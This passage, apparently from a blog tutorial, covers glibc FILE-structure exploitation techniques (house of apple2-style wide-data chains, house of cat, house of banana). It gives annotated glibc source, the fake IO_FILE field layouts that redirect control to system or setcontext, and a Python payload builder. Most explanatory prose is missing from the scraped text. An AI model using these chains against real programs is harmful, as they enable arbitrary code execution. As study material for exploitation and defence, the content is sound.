class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span> _IO_wfile_overflow(FILE *f, <span class="type">wint_t</span> wch) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> ||</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>) &#123;</span><br><span class="line">      _IO_wdoallocbuf(f);</span><br><span class="line">      _IO_free_wbackup_area(f);</span><br><span class="line">      _IO_wsetg(f, f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">                f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.  If _IO_read_ptr</span></span><br><span class="line"><span class="comment">         (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">         logically slide the buffer forwards one block (by setting</span></span><br><span class="line"><span class="comment">         the read pointers to all point at the beginning of the</span></span><br><span class="line"><span class="comment">         block).  This makes room for subsequent output.</span></span><br><span class="line"><span class="comment">         Otherwise, set the read pointers to _IO_read_end (leaving</span></span><br><span class="line"><span class="comment">         that alone, so it can continue to correspond to the</span></span><br><span class="line"><span class="comment">         external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end) &#123;</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">            f-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (wch == WEOF) <span class="keyword">return</span> _IO_do_flush(f);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)</span><br><span class="line">    <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED) ||</span><br><span class="line">      ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == <span class="string">L&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">return</span> wch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span>(_IO_wfile_overflow)</span><br></pre></td></tr></table></figure><p></p><p>1<code>_IO_wfile_overflow</code> fp</p><ul><li><code>_flags</code><code>~(2 | 0x8 | 0x800)</code><code>rdi</code><code>0</code><code>shell</code><code>  sh;</code></li><li><code>vtable</code><code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code><code>_IO_wfile_overflow</code></li><li><code>_wide_data</code><code>A</code><code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code><code>0</code><code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code><code>0</code><code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code><code>B</code><code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code><code>C</code><code>RIP</code><code>*(B + 0x68) = C</code>Csystem</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure><p>2<code>_IO_wfile_underflow_mmap</code> </p><ul><li><code>_flags</code><code>~4</code><code>rdi</code><code>0</code><code>shell</code><code> sh;</code></li><li><code>vtable</code><code>_IO_wfile_jumps_mmap</code><code>_IO_wfile_underflow_mmap</code></li><li><code>_IO_read_ptr &lt; _IO_read_end</code><code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code><code>A</code><code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code><code>*A &gt;= *(A + 8)</code></li><li><code>_wide_data-&gt;_IO_buf_base</code><code>0</code><code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_IO_save_base</code><code>0</code><code>free</code><code>*(A + 0x40) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code><code>B</code><code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code><code>C</code><code>RIP</code><code>*(B + 0x68) = C</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure><p>3<code>_IO_wdefault_xsgetn</code> </p><ul><li><code>_flags</code><code>0x800</code></li><li><code>vtable</code><code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code><code>_IO_wdefault_xsgetn</code></li><li><code>_mode</code><code>0</code><code>*(fp + 0xc0) &gt; 0</code></li><li><code>_wide_data</code><code>A</code><code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code><code>0</code><code>*(A + 8) = *A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code><code>*(A + 0x20) &gt; *(A + 0x18)</code></li><li><code>_wide_data-&gt;_wide_vtable</code><code>B</code><code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code><code>C</code><code>RIP</code><code>*(B + 0x18) = C</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure><p><code>largebin attack</code><code>_IO_list_all</code></p><ul><li><code>IO_FILE</code></li><li>IO_FILE <code>_wide_data</code> <code>_wide_data-&gt;_wide_vtable</code></li><li>IO_FILE <code>vtable</code>  <code>_IO_wfile_jumps</code> const , gdb<code>p &amp;_IO_wfile_jumps</code></li><li>shellcodeCROPsetcontext</li></ul><h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p></p><ul><li><code>_IO_wfile_jumps</code><code>_IO_wfile_seekoff</code><code>_IO_switch_to_wget_mode</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert</span><br><span class="line">__fxprintf</span><br><span class="line">locked_vfxprintf</span><br><span class="line">__vfprintf_internal #IO_validate_vtablevtable+<span class="number">0x38</span></span><br><span class="line">_IO_wfile_seekoff</span><br><span class="line">_IO_switch_to_wget_mode</span><br><span class="line">call qword ptr [rax + <span class="number">0x18</span>] <span class="meta">#raxio_file</span></span><br></pre></td></tr></table></figure><p>house of cat<strong>FSOP</strong><code>_IO_wfile_seekoff</code><code>__malloc_assert</code>vtable<code>_IO_wfile_jumps+0x10</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">do_ftell_wide</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">      || _IO_in_put_mode (fp));</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))   <span class="comment">// xxxx</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_wfile_seekoff)</span><br></pre></td></tr></table></figure><p> <code>_wide_data</code>  <code>vtable_overflow</code>JUMP </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_switch_to_wget_mode)</span><br></pre></td></tr></table></figure><p><code>_IO_switch_to_wget_mode</code> </p><ul><li>rdi  fp  IO_FILE</li><li> rdi raxraxrdxjbecall shellcode</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f4cae745d30</span> &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line"> <span class="number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d3b</span> &lt;_IO_switch_to_wget_mode+<span class="number">11</span>&gt;    push   rbx</span><br><span class="line"> <span class="number">0x7f4cae745d3c</span> &lt;_IO_switch_to_wget_mode+<span class="number">12</span>&gt;    mov    rbx, rdi</span><br><span class="line"> <span class="number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d47</span> &lt;_IO_switch_to_wget_mode+<span class="number">23</span>&gt;    jbe    _IO_switch_to_wget_mode+<span class="number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="number">56</span>&gt;</span><br><span class="line"></span><br><span class="line"> <span class="number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d50</span> &lt;_IO_switch_to_wget_mode+<span class="number">32</span>&gt;    mov    esi, <span class="number">0xffffffff</span></span><br><span class="line"> <span class="number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure><p></p><ul><li>rax1 rax</li><li>rax2 rax</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr = heapbase+<span class="number">0xb00</span>                        <span class="comment"># fake_IO</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(rdi)                              <span class="comment"># _flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>)                        <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>)               <span class="comment"># _IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(call_addr)                       <span class="comment"># _IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                               <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)                 <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)               <span class="comment"># _wide_data, rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                               <span class="comment"># mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)          <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)               <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure><h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><p>IO_FILEexit <code>rtld_global</code> </p><ul><li><code>large bin attack</code></li><li><code>main</code><code>exit</code></li><li><code>libc</code></li></ul><p>gdb </p><ul><li>ld.so libc.sym</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">p &amp;_rtld_global</span><br></pre></td></tr></table></figure><p><code>rtld_global</code><code>_dl_ns</code> main  exit <code>exit()-&gt;_dl_call_fini-&gt;(fini_t)array[i]</code></p><ul><li>glibc 2.37  <code>_dl_call_fini(l);</code>debugging</li><li>link map </li><li>nmaps  <code>maps[]</code>  <code>GL(dl_ns)[ns]._ns_loaded</code></li><li></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _dl_fini(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_nns  =&gt;  1</span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = <span class="built_in">GL</span>(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_nloaded  =&gt; 4</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nloaded = <span class="built_in">GL</span>(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">       auditing DSOs.  */</span></span><br><span class="line">    <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    )</span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_DELETE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">         copy the pointers in.  */</span></span><br><span class="line">  <span class="comment">// nloaded =&gt; 4</span></span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *maps[nloaded];</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">      <span class="built_in">assert</span>(nloaded != <span class="number">0</span> || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ns=0    pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded</span></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_next.l_next.l_next.l_next  0</span></span><br><span class="line">      <span class="keyword">for</span> (l = <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">        <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">        <span class="comment">// pwndbg p _rtld_global._dl_ns[0]._ns_loaded.l_real</span></span><br><span class="line">        <span class="comment">// if</span></span><br><span class="line">        <span class="keyword">if</span> (l == l-&gt;l_real) &#123;</span><br><span class="line">          <span class="built_in">assert</span>(i &lt; nloaded);   <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line">          maps[i] = l;</span><br><span class="line">          l-&gt;l_idx = i;</span><br><span class="line">          ++i;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">             are not dlclose()ed from underneath us.  */</span></span><br><span class="line">          ++l-&gt;l_direct_opencount;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">assert</span>(ns != LM_ID_BASE || i == nloaded);  <span class="comment">// i==nloaded,if</span></span><br><span class="line">      <span class="built_in">assert</span>(ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">         binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">         the main namespace.  */</span></span><br><span class="line">      _dl_sort_maps(maps, nmaps, (ns == LM_ID_BASE), <span class="literal">true</span>); </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">         from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">         various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">         count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">         we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">         from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">         lock.  */</span></span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">         call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">         the front.  */</span></span><br><span class="line">  <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];   <span class="comment">// _ns_loaded</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_init_called) &#123;</span><br><span class="line">          _dl_call_fini(l);            <span class="comment">// </span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">          <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">          _dl_audit_objclose(l);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">        --l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, 